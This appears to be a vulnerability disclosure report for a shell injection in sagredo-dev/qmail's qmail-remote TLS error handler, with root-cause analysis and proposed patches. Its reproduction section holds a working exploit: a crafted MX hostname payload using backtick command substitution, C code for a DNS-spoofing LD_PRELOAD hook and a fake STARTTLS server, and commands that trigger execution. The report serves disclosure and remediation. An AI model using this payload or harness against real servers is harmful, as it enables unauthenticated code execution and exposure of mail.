# Remote Code Execution via Shell Injection in qmail-remote TLS Error Handler

## 1. Summary

| Field | Value |
| :---- | :---- |
| **Title** | Shell command injection via DNS MX hostname in qmail-remote `tls_quit()` leads to remote code execution |
| **Affected Software** | [sagredo-dev/qmail](https://github.com/sagredo-dev/qmail), tested on v2026.04.02 (commit `06b79b3`) |
| **Affected Versions** | Introduced in v2024.10.26 (commit `326513f`), not yet fixed as of v2026.04.02 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Severity** | High — **CVSS 3.1 Base: 8.2** |

When an outbound TLS handshake fails, `qmail-remote` automatically records the remote hostname in a blocklist file by executing a shell command constructed from the unsanitized DNS MX exchange name. An attacker who controls DNS records for a domain can embed shell metacharacters in the MX hostname, achieving arbitrary command execution on the mail server as the `qmailr` user. The vulnerability requires the `control/notlshosts_auto` feature to be enabled (a documented production feature for handling broken TLS hosts) and for the victim server to send or relay email to the attacker-controlled domain.

## 2. Technical Details

The `tls_quit()` function in [`qmail-remote.c:399`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/qmail-remote.c#L399) is called whenever a TLS error occurs during outbound SMTP delivery. Its purpose is to log the error and, when the `control/notlshosts_auto` feature is enabled, create a file under `control/notlshosts/` named after the remote server's FQDN so that future deliveries to that host skip TLS entirely.

The mechanism for creating this file is a shell command built with `sprintf()` and executed with `popen()` at [`qmail-remote.c:412-413`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/qmail-remote.c#L412-L413):

```c
sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", info->pw_dir, partner_fqdn);
fp = popen(acfcommand, "r");
```

The developer wrapped `%s` in single quotes, intending to prevent shell interpretation of the hostname. However, this defense is trivially bypassed because the single-quote character (`'`) itself is never escaped. If `partner_fqdn` contains a single quote, the quoting context is broken and subsequent characters are interpreted by the shell.

The `partner_fqdn` variable originates from DNS MX record resolution. When `qmail-remote` delivers mail, it queries DNS for MX records. The MX exchange hostname is extracted from the wire-format DNS response by `dn_expand()` in [`dns.c:186`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/dns.c#L186). The extracted name is stored in `mx[nummx].sa` at [`dns.c:449`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/dns.c#L449), propagated through `dns_ipplus()` where it is assigned as `ix.fqdn = glue.s` at [`dns.c:382`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/dns.c#L382), and finally read by `qmail-remote` at [`qmail-remote.c:1118`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/qmail-remote.c#L1118) as `partner_fqdn = ip.ix[i].fqdn`.

The glibc `dn_expand()` function (internally `ns_name_ntop()`) does escape some special characters — specifically `;`, `$`, `(`, `)`, `"`, and `\` are backslash-escaped. However, it does not escape single quotes (`'`), backticks (`` ` ``), pipes (`|`), ampersands (`&`), or redirection operators (`>`, `<`). DNS wire format imposes no character restrictions on label contents: each label is a length-prefixed byte sequence, and any byte value except the length byte can appear. Recursive resolvers generally pass label bytes through without validation.

An attacker exploits this by registering a domain (e.g., `evil.com`) and configuring its MX record to point to a hostname like `x'`id>/tmp/pwned`'y.evil.com`. This hostname is 29 bytes in the first label, well within the 63-byte label limit. The attacker also configures an A record for this hostname pointing to an SMTP server they control.

When the victim qmail server delivers mail to `evil.com`, it resolves the MX record and receives the crafted hostname. `qmail-remote` connects to the attacker's SMTP server, which advertises STARTTLS but then causes the TLS handshake to fail (e.g., by sending a TLS `handshake_failure` alert). This triggers `tls_quit()` at [`qmail-remote.c:548`](https://github.com/sagredo-dev/qmail/blob/06b79b3860c92b58d2e2b677138f0ffa03dd213b/qmail-remote.c#L548), which constructs and executes:

```
/bin/touch /var/qmail/control/notlshosts/'x'`id>/tmp/pwned`'y.evil.com'
```

The shell parses this as three separate elements: the `touch` command operating on a file named `x`, a backtick command substitution executing `id>/tmp/pwned`, and a bare word `y.evil.com`. The backtick-enclosed command runs with the privileges of the `qmailr` user.

The feature was introduced in commit [`326513f`](https://github.com/sagredo-dev/qmail/commit/326513f79724cc2a6247df180b96de0dabbcf812) on October 22, 2024, first included in the v2024.10.26 release tag. The vulnerable `popen()` pattern has remained unchanged through all subsequent releases up to and including v2026.04.02.

## 3. Impact

This vulnerability provides an unauthenticated remote code execution primitive. An attacker with no prior access to the target mail server can execute arbitrary commands as the `qmailr` user by simply controlling DNS records for a domain and running a malicious SMTP server — both of which are trivial for any domain registrant.

The attack is triggered automatically when the victim server delivers any email to the attacker's domain. This can happen through direct sending, forwarding rules, mailing list redistribution, or bounce processing. No user interaction is required beyond normal mail flow.

As the `qmailr` user, the attacker can read queued email messages (which may contain sensitive data), modify qmail control files to redirect mail delivery, and write to the qmail home directory. Depending on system configuration, this access may be leveraged to plant persistent backdoors (cron jobs, SSH keys) or escalate to other qmail service users who share the same home directory. The blast radius extends to the entire mail server: all mail flowing through the system is exposed, and the attacker can manipulate routing for all domains handled by the server.

The primary constraint is that the `control/notlshosts_auto` configuration must be enabled. This is a documented production feature designed for servers that encounter TLS compatibility issues with remote hosts, and its use is recommended in the project documentation.

## 4. Steps to Reproduce

**Environment:** Linux x86_64 with Docker installed. The target qmail is built from source inside a Debian container with TLS support enabled (the default).

**Step 1: Build and configure qmail**

Start a Debian container and build qmail from the repository:

```bash
docker run -d --name qmail-test debian:bookworm sleep infinity
docker exec qmail-test bash -c '
  apt-get update && apt-get install -y gcc make libssl-dev git
  cd /tmp && git clone https://github.com/sagredo-dev/qmail.git
  cd qmail
  # Create required users and groups
  groupadd -g 2108 nofiles
  groupadd -g 2109 qmail
  useradd -u 7790 -g nofiles -d /var/qmail alias
  useradd -u 7791 -g nofiles -d /var/qmail qmaild
  useradd -u 7792 -g nofiles -d /var/qmail qmaill
  useradd -u 7793 -g nofiles -d /var/qmail qmailp
  useradd -u 7794 -g qmail -d /var/qmail qmailq
  useradd -u 7795 -g qmail -d /var/qmail qmailr
  useradd -u 7796 -g qmail -d /var/qmail qmails
  make setup check
  echo "localhost" > /var/qmail/control/me
  echo "localhost" > /var/qmail/control/helohost
'
```

Enable the `notlshosts_auto` feature (a documented production configuration):

```bash
docker exec qmail-test bash -c '
  echo "1" > /var/qmail/control/notlshosts_auto
  mkdir -p /var/qmail/control/notlshosts
  chmod 777 /var/qmail/control/notlshosts
'
```

**Step 2: Prepare the exploit components**

Create a C program that hooks DNS resolution to simulate an attacker's authoritative DNS server returning crafted MX records. In a real attack, the attacker's DNS server returns these records directly — the LD_PRELOAD hook is test infrastructure only.

Save the following as `dns_hook.c`:

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdarg.h>
#include <sys/socket.h>

/* Payload hostname label: x'`id>/tmp/qmail_rce_proof`'y
   The single quotes break the shell quoting in tls_quit()'s sprintf,
   and backticks provide command substitution */
static const char PAYLOAD[] = {
    'x','\'','`','i','d','>','/','t','m','p','/','q','m','a','i','l',
    '_','r','c','e','_','p','r','o','o','f','`','\'','y',0
};

#define FAKE_IP_A 10
#define FAKE_IP_B 253
#define FAKE_IP_C 253
#define FAKE_IP_D 1
#define LOCAL_SMTP_PORT 2525

static void write_name(unsigned char *buf, int *pos, const char *name) {
    const char *p = name;
    while (*p) {
        const char *dot = strchr(p, '.');
        int len = dot ? (dot - p) : (int)strlen(p);
        buf[(*pos)++] = (unsigned char)len;
        memcpy(buf + *pos, p, len); *pos += len;
        if (dot) p = dot + 1; else break;
    }
    buf[(*pos)++] = 0;
}

static int build_mx_response(unsigned char *answer, int anslen, const char *qname) {
    int plen = strlen(PAYLOAD);
    memset(answer, 0, anslen > 512 ? 512 : anslen);
    HEADER *hp = (HEADER *)answer;
    hp->id = 0x1234; hp->qr = 1; hp->aa = 1; hp->rd = 1; hp->ra = 1;
    hp->qdcount = htons(1); hp->ancount = htons(1);
    int pos = 12;
    write_name(answer, &pos, qname);
    answer[pos++]=0; answer[pos++]=15; answer[pos++]=0; answer[pos++]=1;
    /* answer section: compressed name, MX type, IN class, TTL, rdata */
    answer[pos++]=0xc0; answer[pos++]=0x0c;
    answer[pos++]=0; answer[pos++]=15; answer[pos++]=0; answer[pos++]=1;
    answer[pos++]=0; answer[pos++]=0; answer[pos++]=0x0e; answer[pos++]=0x10;
    int rdl=pos; pos+=2; int rds=pos;
    answer[pos++]=0; answer[pos++]=10; /* preference */
    /* MX exchange: payload label + .evil.com */
    answer[pos++]=(unsigned char)plen;
    memcpy(answer+pos, PAYLOAD, plen); pos+=plen;
    answer[pos++]=4; memcpy(answer+pos,"evil",4); pos+=4;
    answer[pos++]=3; memcpy(answer+pos,"com",3); pos+=3;
    answer[pos++]=0;
    int rd=pos-rds; answer[rdl]=(rd>>8)&0xff; answer[rdl+1]=rd&0xff;
    return pos;
}

static int build_a_response(unsigned char *answer, int anslen, const char *qname) {
    memset(answer, 0, anslen > 512 ? 512 : anslen);
    HEADER *hp = (HEADER *)answer;
    hp->id = 0x1235; hp->qr = 1; hp->aa = 1; hp->rd = 1; hp->ra = 1;
    hp->qdcount = htons(1); hp->ancount = htons(1);
    int pos = 12;
    write_name(answer, &pos, qname);
    answer[pos++]=0; answer[pos++]=1; answer[pos++]=0; answer[pos++]=1;
    answer[pos++]=0xc0; answer[pos++]=0x0c;
    answer[pos++]=0; answer[pos++]=1; answer[pos++]=0; answer[pos++]=1;
    answer[pos++]=0; answer[pos++]=0; answer[pos++]=0x0e; answer[pos++]=0x10;
    answer[pos++]=0; answer[pos++]=4;
    answer[pos++]=FAKE_IP_A; answer[pos++]=FAKE_IP_B;
    answer[pos++]=FAKE_IP_C; answer[pos++]=FAKE_IP_D;
    return pos;
}

int res_query(const char *dname, int class, int type,
              unsigned char *answer, int anslen) {
    if (type == 15) return build_mx_response(answer, anslen, dname);
    if (type == 1)  return build_a_response(answer, anslen, dname);
    int (*real)(const char*,int,int,unsigned char*,int) =
        dlsym(RTLD_NEXT, "res_query");
    return real ? real(dname, class, type, answer, anslen) : -1;
}
int res_search(const char *d,int c,int t,unsigned char *a,int l) {
    return res_query(d,c,t,a,l);
}
int __res_query(const char *d,int c,int t,unsigned char *a,int l) {
    return res_query(d,c,t,a,l);
}
int __res_search(const char *d,int c,int t,unsigned char *a,int l) {
    return res_query(d,c,t,a,l);
}

/* Redirect connections to the fake IP to our local SMTP server */
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    int (*real_connect)(int, const struct sockaddr*, socklen_t) =
        dlsym(RTLD_NEXT, "connect");
    if (!real_connect) return -1;
    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        unsigned char *ip = (unsigned char *)&sin->sin_addr.s_addr;
        if (ip[0]==FAKE_IP_A && ip[1]==FAKE_IP_B &&
            ip[2]==FAKE_IP_C && ip[3]==FAKE_IP_D &&
            ntohs(sin->sin_port) == 25) {
            struct sockaddr_in redir;
            memcpy(&redir, sin, sizeof(redir));
            redir.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            redir.sin_port = htons(LOCAL_SMTP_PORT);
            return real_connect(sockfd, (struct sockaddr*)&redir, sizeof(redir));
        }
    }
    return real_connect(sockfd, addr, addrlen);
}
```

Save the following as `fake_smtp.c` — a minimal SMTP server that advertises STARTTLS then fails the handshake:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv) {
    int port = argc > 1 ? atoi(argv[1]) : 2525;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port = htons(port);
    if (bind(s, (struct sockaddr*)&a, sizeof(a)) < 0) { perror("bind"); return 1; }
    listen(s, 5);
    int c = accept(s, NULL, NULL);
    if (c < 0) { perror("accept"); return 1; }
    write(c, "220 evil.com ESMTP\r\n", 20);
    char buf[1024];
    read(c, buf, sizeof(buf)-1);  /* EHLO */
    write(c, "250-evil.com\r\n250 STARTTLS\r\n", 28);
    read(c, buf, sizeof(buf)-1);  /* STARTTLS */
    write(c, "220 Ready to start TLS\r\n", 24);
    usleep(100000);
    /* TLS fatal alert: handshake_failure */
    unsigned char alert[] = {0x15, 0x03, 0x01, 0x00, 0x02, 0x02, 0x28};
    write(c, alert, sizeof(alert));
    usleep(200000);
    close(c);
    close(s);
    return 0;
}
```

**Step 3: Compile and run the exploit**

Compile the hook library and fake SMTP server inside the container:

```bash
docker exec qmail-test bash -c '
  # Create version script for symbol interposition
  cat > /tmp/hook.ver << "VEOF"
GLIBC_2.34 { global: res_query; res_search; };
GLIBC_2.2.5 { global: __res_query; __res_search; };
VEOF
  gcc -shared -fPIC -o /tmp/dns_hook.so /tmp/dns_hook.c -ldl \
      -Wl,--version-script=/tmp/hook.ver
  gcc -o /tmp/fake_smtp /tmp/fake_smtp.c
'
```

Start the fake SMTP server and trigger qmail-remote:

```bash
# Start fake SMTP server in background
docker exec -d qmail-test /tmp/fake_smtp 2525

# Wait for server to start
sleep 1

# Trigger qmail-remote delivery to attacker domain
docker exec qmail-test bash -c '
  rm -f /tmp/qmail_rce_proof
  printf "From: a@a.com\r\nTo: b@evil.com\r\nSubject: test\r\n\r\ntest\r\n" | \
    LD_PRELOAD=/tmp/dns_hook.so \
    /var/qmail/bin/qmail-remote evil.com a@a.com b@evil.com
'
```

**Step 4: Verify code execution**

```bash
docker exec qmail-test cat /tmp/qmail_rce_proof
```

Expected output (uid values will vary):

```
uid=7795(qmailr) gid=2109(qmail) groups=2109(qmail)
```

This confirms that the `id` command was executed via the injected shell metacharacters during the `popen()` call in `tls_quit()`.

| Artifact | Description |
| :---- | :---- |
| `exploit.py` | End-to-end Python exploit automating both phases of the attack |
| `dns_hook.c` | LD_PRELOAD library simulating attacker's DNS server and SMTP redirect |
| `fake_smtp.c` | Minimal SMTP server that triggers TLS handshake failure |
| Build configuration | Standard `make setup check` with default TLS flags |
| Environment | Debian Bookworm (x86_64), gcc, libssl-dev, glibc 2.36+ |

Note: The LD_PRELOAD hooks are test infrastructure only. In a real attack scenario, the attacker controls their own authoritative DNS server (which returns the crafted MX records) and their own SMTP server (which fails TLS). No special access to the victim is required.

## 5. Recommendations

**Fix 1 — [root cause fix] Replace `popen()` shell command with direct file creation**

The root cause is using a shell command to create a file, allowing injection through the filename. The fix replaces `sprintf()` + `popen()` with direct file system operations that do not involve shell interpretation. This eliminates the entire class of injection attacks regardless of what characters appear in the hostname.

```diff
diff --git a/qmail-remote.c b/qmail-remote.c
--- a/qmail-remote.c
+++ b/qmail-remote.c
@@ -394,7 +394,9 @@
 
 #ifdef TLS
 char *partner_fqdn = 0;
 
+#include <fcntl.h>
+
 # define TLS_QUIT quit(ssl ? "; connected to " : "; connecting to ", "")
 void tls_quit(const char *s1, const char *s2)
 {
@@ -407,14 +409,19 @@ void tls_quit(const char *s1, const char *s2)
   unsigned long i = 0;
   if (control_readint(&i,"control/notlshosts_auto") && i) {
     struct passwd *info = getpwuid(getuid()); // get qmail dir
-    FILE *fp;
-    char acfcommand[1200];
-    sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", info->pw_dir, partner_fqdn);
-    fp = popen(acfcommand, "r");
-    if (fp == NULL) {
-      out("Failed to run touch command ");
-      exit(1);
+    char filepath[1200];
+    int fd;
+    int n;
+    n = snprintf(filepath, sizeof(filepath), "%s/control/notlshosts/%s",
+                 info->pw_dir, partner_fqdn);
+    if (n > 0 && n < sizeof(filepath)
+        && !strstr(partner_fqdn, "/") && !strstr(partner_fqdn, "..")) {
+      fd = open(filepath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+      if (fd >= 0)
+        close(fd);
     }
-    pclose(fp);
   }
   /* end skip TLS patch */
   out((char *)s1); if (s2) { out(": "); out((char *)s2); } TLS_QUIT;
```

**Fix 2 — [defense in depth] Validate hostname characters before use**

As an additional safeguard, validate that `partner_fqdn` contains only characters legal in DNS hostnames (letters, digits, hyphens, dots) before using it in any file operation. This prevents exploitation even if a future code change reintroduces a shell call or other injection vector.

```diff
diff --git a/qmail-remote.c b/qmail-remote.c
--- a/qmail-remote.c
+++ b/qmail-remote.c
@@ -395,6 +395,17 @@
 #ifdef TLS
 char *partner_fqdn = 0;
 
+/* Returns 1 if s contains only valid hostname characters (RFC 952/1123) */
+static int valid_hostname(const char *s)
+{
+  if (!s || !*s) return 0;
+  for (; *s; s++) {
+    if (!((*s >= 'a' && *s <= 'z') || (*s >= 'A' && *s <= 'Z') ||
+          (*s >= '0' && *s <= '9') || *s == '-' || *s == '.'))
+      return 0;
+  }
+  return 1;
+}
+
 # define TLS_QUIT quit(ssl ? "; connected to " : "; connecting to ", "")
 void tls_quit(const char *s1, const char *s2)
 {
@@ -407,14 +418,17 @@ void tls_quit(const char *s1, const char *s2)
   unsigned long i = 0;
   if (control_readint(&i,"control/notlshosts_auto") && i) {
     struct passwd *info = getpwuid(getuid()); // get qmail dir
-    FILE *fp;
-    char acfcommand[1200];
-    sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", info->pw_dir, partner_fqdn);
-    fp = popen(acfcommand, "r");
-    if (fp == NULL) {
-      out("Failed to run touch command ");
-      exit(1);
+    if (!valid_hostname(partner_fqdn)) {
+      out("Z Invalid hostname, skipping notlshosts entry\n");
+    } else {
+      int fd;
+      char filepath[1200];
+      int n;
+      n = snprintf(filepath, sizeof(filepath), "%s/control/notlshosts/%s",
+                   info->pw_dir, partner_fqdn);
+      if (n > 0 && n < (int)sizeof(filepath)) {
+        fd = open(filepath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd >= 0) close(fd);
+      }
     }
-    pclose(fp);
   }
   /* end skip TLS patch */
   out((char *)s1); if (s2) { out(": "); out((char *)s2); } TLS_QUIT;
```
